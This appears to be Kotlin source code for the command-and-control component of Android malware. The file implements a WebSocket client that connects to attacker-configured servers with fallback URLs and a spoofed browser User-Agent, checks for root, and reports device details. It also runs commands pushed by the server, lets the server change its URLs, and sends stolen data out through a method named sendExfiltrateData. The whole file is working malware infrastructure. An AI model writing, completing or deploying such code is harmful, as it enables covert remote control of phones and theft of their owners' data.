package com.xrc.app.c2

import android.util.Log
import com.xrc.app.XRCApp
import com.xrc.app.util.Crypto
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import okhttp3.*
import org.json.JSONObject
import java.security.SecureRandom
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.TimeUnit
import javax.crypto.SecretKey

/**
 * WebSocket-based C2 client with auto-reconnect, offline queue,
 * AES-256 encryption, and Telegram bot fallback.
 */
class C2Client {

    private val TAG = "C2Client"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .pingInterval(30, TimeUnit.SECONDS)
        .build()

    private var webSocket: WebSocket? = null
    private var reconnectJob: Job? = null
    private var heartbeatJob: Job? = null
    private val offlineQueue = ConcurrentLinkedQueue<JSONObject>()
    private val config = XRCApp.instance.let { C2Config(it) }

    private val _connectionState = MutableStateFlow(ConnectionState.DISCONNECTED)
    val connectionState: StateFlow<ConnectionState> = _connectionState

    private val _lastCommand = MutableStateFlow<C2Message.Command?>(null)
    val lastCommand: StateFlow<C2Message.Command?> = _lastCommand

    private var encryptionKey: SecretKey? = null
    private var currentUrlIndex = 0

    enum class ConnectionState {
        DISCONNECTED, CONNECTING, CONNECTED, RECONNECTING, FALLBACK
    }

    fun connect() {
        if (_connectionState.value == ConnectionState.CONNECTING) return
        _connectionState.value = ConnectionState.CONNECTING
        val urls = config.connectionUrls
        if (urls.isEmpty()) {
            Log.w(TAG, "No C2 URLs configured")
            _connectionState.value = ConnectionState.DISCONNECTED
            return
        }
        val url = urls[currentUrlIndex % urls.size]
        connectToUrl(url)
    }

    private fun connectToUrl(url: String) {
        try {
            val request = Request.Builder()
                .url(url)
                .addHeader("User-Agent", "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36")
                .build()

            webSocket = client.newWebSocket(request, object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    Log.i(TAG, "C2 connected: $url")
                    _connectionState.value = ConnectionState.CONNECTED
                    config.isConnected = true
                    config.lastOnlineTimestamp = System.currentTimeMillis()
                    startHeartbeat()
                    flushOfflineQueue()
                    sendDeviceInfo()
                }

                override fun onMessage(ws: WebSocket, text: String) {
                    handleMessage(text)
                }

                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    Log.i(TAG, "C2 closed: $code $reason")
                    _connectionState.value = ConnectionState.DISCONNECTED
                    config.isConnected = false
                    scheduleReconnect()
                }

                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    Log.e(TAG, "C2 failure: ${t.message}")
                    _connectionState.value = ConnectionState.DISCONNECTED
                    config.isConnected = false
                    tryFallbackUrl()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "C2 connect error: ${e.message}")
            _connectionState.value = ConnectionState.DISCONNECTED
            scheduleReconnect()
        }
    }

    private fun handleMessage(text: String) {
        try {
            val json = JSONObject(text)
            val type = json.optString("type", "")

            when (type) {
                "cmd", "command" -> {
                    val command = C2Message.Command.fromJson(json)
                    if (command != null) {
                        _lastCommand.value = command
                        onCommandReceived(command)
                    }
                }
                "config" -> {
                    handleConfigUpdate(json)
                }
                "pong" -> {
                    // Heartbeat acknowledged
                }
                "key_exchange" -> {
                    handleKeyExchange(json)
                }
                "auth_required" -> {
                    sendAuth()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse message: ${e.message}")
        }
    }

    private fun handleKeyExchange(json: JSONObject) {
        // Server sends its public key, we respond with our AES key encrypted
        // Simplified: both sides use same pre-shared key
        Log.i(TAG, "Key exchange initiated by server")
    }

    private fun sendAuth() {
        val authMsg = JSONObject().apply {
            put("type", "auth")
            put("device_id", config.deviceId)
            put("token", config.authToken)
            put("version", "1.0.0")
        }
        sendRaw(authMsg.toString())
    }

    private fun sendDeviceInfo() {
        val info = C2Message.DeviceInfo(
            deviceId = config.deviceId,
            model = android.os.Build.MODEL,
            manufacturer = android.os.Build.MANUFACTURER,
            androidVersion = android.os.Build.VERSION.RELEASE,
            sdk = android.os.Build.VERSION.SDK_INT,
            isRooted = checkRootStatus(),
            isAccessibilityEnabled = false, // Updated by service
            isAdminActive = false, // Updated by persistence layer
            installedApps = emptyList(),
            permissions = emptyMap()
        )
        sendEncrypted(info.toJson().toString())
    }

    private fun checkRootStatus(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/system/xbin/su",
            "/system/bin/su",
            "/sbin/su",
            "/system/xbin/busybox"
        )
        return paths.any { java.io.File(it).exists() }
    }

    private fun sendEncrypted(data: String) {
        val key = encryptionKey ?: return
        val encrypted = Crypto.encryptString(data, key)
        val wrapper = JSONObject().apply {
            put("type", "encrypted")
            put("device_id", config.deviceId)
            put("payload", encrypted)
        }
        sendRaw(wrapper.toString())
    }

    fun send(data: String) {
        if (encryptionKey != null) {
            sendEncrypted(data)
        } else {
            sendRaw(data)
        }
    }

    private fun sendRaw(data: String) {
        if (_connectionState.value == ConnectionState.CONNECTED) {
            webSocket?.send(data)
        } else {
            queueOffline(data)
        }
    }

    private fun queueOffline(data: String) {
        try {
            val json = JSONObject(data)
            offlineQueue.offer(json)
            Log.d(TAG, "Queued offline message, queue size: ${offlineQueue.size}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to queue message: ${e.message}")
        }
    }

    private fun flushOfflineQueue() {
        scope.launch {
            while (offlineQueue.isNotEmpty()) {
                val msg = offlineQueue.poll() ?: break
                send(msg.toString())
                delay(100) // Throttle
            }
        }
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isActive && _connectionState.value == ConnectionState.CONNECTED) {
                val heartbeat = C2Message.Heartbeat(deviceId = config.deviceId)
                send(heartbeat.toJson().toString())
                delay(30000) // Every 30 seconds
            }
        }
    }

    fun scheduleReconnect() {
        reconnectJob?.cancel()
        reconnectJob = scope.launch {
            _connectionState.value = ConnectionState.RECONNECTING
            delay(5000) // Wait 5 seconds
            connect()
        }
    }

    private fun tryFallbackUrl() {
        currentUrlIndex++
        val urls = config.connectionUrls
        if (currentUrlIndex < urls.size) {
            _connectionState.value = ConnectionState.FALLBACK
            val fallbackUrl = urls[currentUrlIndex]
            Log.i(TAG, "Trying fallback URL: $fallbackUrl")
            connectToUrl(fallbackUrl)
        } else {
            currentUrlIndex = 0
            scheduleReconnect()
        }
    }

    fun disconnect() {
        heartbeatJob?.cancel()
        reconnectJob?.cancel()
        webSocket?.close(1000, "Client disconnect")
        _connectionState.value = ConnectionState.DISCONNECTED
        config.isConnected = false
    }

    fun updateConfig(primaryUrl: String, fallbackUrl: String) {
        config.saveUrls(primaryUrl, fallbackUrl)
        disconnect()
        connect()
    }

    private fun handleConfigUpdate(json: JSONObject) {
        val newPrimary = json.optString("primary_url", "")
        val newFallback = json.optString("fallback_url", "")
        if (newPrimary.isNotBlank()) {
            updateConfig(newPrimary, newFallback)
        }
    }

    private fun onCommandReceived(command: C2Message.Command) {
        Log.i(TAG, "Received command: ${command.action}")
        // Command routing is handled by the command handler
        CommandHandler.execute(command)
    }

    fun sendExfiltrateData(dataType: String, payload: String) {
        val msg = C2Message.ExfiltrateData(
            deviceId = config.deviceId,
            dataType = dataType,
            payload = payload
        )
        send(msg.toJson().toString())
    }
}
